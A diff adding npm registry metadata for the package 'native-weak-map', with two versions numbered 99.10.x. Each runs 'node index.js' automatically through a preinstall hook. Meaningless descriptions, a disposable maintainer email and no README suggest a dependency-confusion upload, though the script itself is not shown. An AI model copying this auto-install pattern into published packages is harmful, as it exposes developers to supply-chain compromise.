@@ -1,0 +1,103 @@
+{
+    "_id": "native-weak-map",
+    "_rev": "1-4a1535bdb0aa59bd319793e8a38b64bf",
+    "name": "native-weak-map",
+    "dist-tags": {
+        "latest": "99.10.13"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "native-weak-map",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "native-weak-map@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-IOwlR0FlIpV5O9g4g4U7pbr8acrVHKqw4wCo+P5CdgBiKGMf2mIUuA6wtT/HASIoAqs77FqGONPp7lugq+ifow==",
+                "shasum": "72569831a777553d89d2d98acbe6a698994a0090",
+                "tarball": "https://registry.npmjs.org/native-weak-map/-/native-weak-map-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5067,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQKIOACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmqfww//d1bNZlwKvkgeklYe2zwkEuu1CQxEfQPmfmZz8GZ74BGnlIpC\r\nQFFmnEyKCw/sVzDk7XwUAzWyxdPl8eFqIWcArjY1hVwLV8M6IH+tOIqyAjs0\r\nogCeewf4qEe60EnOvvg3ous2UhuSNs8qVlIA7YXSU2hDtcF4g8QwdmbmN6+N\r\n9VdtDS+SR4mrsuInyBfouJnsXCERZ7+5yeIOaAnIJfGpjvFue863+ImWRDiD\r\nG5bLt8+4kgCOFOZ78VWbE2FtMEkibkeIoSFWSlDaPnCSenOwpEBAMIpetRt6\r\nkdy5AeKG1aMogK1dvef1fT5Btz5nmInpa1Fdl8Z5aMfreIJIp+b9QCUmzoQR\r\nrM9oHCJRUi5dF0qPkplPfgSFlDvWjFABmdDMF6rsJmXzxdlqBHu6o59+p4rF\r\nXCNTWLadJQ29fdQSlsWs0NQnkWrei7E//T6OqtHPg2RiYCRyhKsuq7dJO7VC\r\nblQlQvoVrS6P6Ip7F6gBWzqi701rEFOdAhSiuvrtRDamynCqUDkU/9ALwxlo\r\nrFTNcVtWgX7pPmtT+KM1sXNf6Etvubdy/U4WWcnXOXb6bpO3swMFEGu22eUQ\r\nlRPjhfu8a5L2ZVkQZ+vPoDL7HfFekW8vliagyU8F23KyY8RR0e41HU+cXfiz\r\n/7pv1W3pLeFkr3wnueuUPuyhI2XhI5uGMv8=\r\n=7Yvl\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "ovyj358x",
+                "email": "ovyj358x@33mail.ga"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "ovyj358x",
+                    "email": "ovyj358x@33mail.ga"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/native-weak-map_99.10.9_1648402957873_0.24631066199083795"
+            },
+            "_hasShrinkwrap": false
+        },
+        "99.10.13": {
+            "name": "native-weak-map",
+            "version": "99.10.13",
+            "description": "rukkaz package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "native-weak-map@99.10.13",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-aKuBTHURjZMxni0d/puZ5EXyjLcIW/7vP7zP0uTbYwdZKRZ3XnPufRwgp80MPYfrNJLG+HkwMjVDwHGVmqzdwA==",
+                "shasum": "86753f94ffbc05f775ac44d7379ffa770082c701",
+                "tarball": "https://registry.npmjs.org/native-weak-map/-/native-weak-map-99.10.13.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5073,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOX/ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmo1EQ//RCZCbmFHcUuROKEtGK0dZwLgca77jx9Jc7kk7f7dHDVqUBe3\r\nz+Jjmbsk+5txCbCyjEECBVOopkcBpWc8EJpJm3a5wWKRHyHpee+SEX2S2Yef\r\nJQfstkO1M/wchU+Pso+o5pnm1WUCZQ0deqGWIEiSuJSDU04AxV2h80ys++7q\r\np86uTuHeANHRBbCpM8t4jKAbgCuulld5PMr95/VcMeGdcA4+TzJjImYgKIaA\r\nmv0Rn6hOME2QJVHcalh+g/OC9zWCYT4ksmCrXQWR6VTZIuj4nVI81+U5Rfwp\r\nxyTLVvOln9ArLWoHxQtA1oZudv6n0yjUbKs1EwYHWNJJWHYDvGhoAcarfYo+\r\nElXHJYFU2NiTcGw594dmY/t+EQHy99aWJ/Qcd3nt5kWw+5SffAOUJSUvpL82\r\nTcpOwAtVF43OwDyzGx8QGdYFmQvvrTbQggifSzMoyw73XPHzoiC7UbO0/DDC\r\nRtWEFGqVDT8ZV7KdMcsZ8hcS0rgMUBRTZ+66xHrcis7hlQBkn0fjO3D+3HQJ\r\nL1SGskLfo9WXxZGcSCvLFsJkvq5Oyk4liOGVMIXaX6eCEtR1tZXUzeuUww4C\r\nbFcRI02Sw6EWMQe9bpNThDfL2N0ZnF3GE692Eb0q8Df9k5dug3IXdBAuAN48\r\n6yOhKDNlylgL3XjcL+xJEcBNdflI/DzdPzA=\r\n=yHPy\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "ovyj358x",
+                "email": "ovyj358x@33mail.ga"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "ovyj358x",
+                    "email": "ovyj358x@33mail.ga"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/native-weak-map_99.10.13_1648420351795_0.866486132171145"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-27T17:42:37.872Z",
+        "99.10.9": "2022-03-27T17:42:38.066Z",
+        "modified": "2022-03-27T22:32:31.966Z",
+        "99.10.13": "2022-03-27T22:32:31.924Z"
+    },
+    "maintainers": [
+        {
+            "name": "ovyj358x",
+            "email": "ovyj358x@33mail.ga"
+        }
+    ],
+    "description": "rukkaz package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
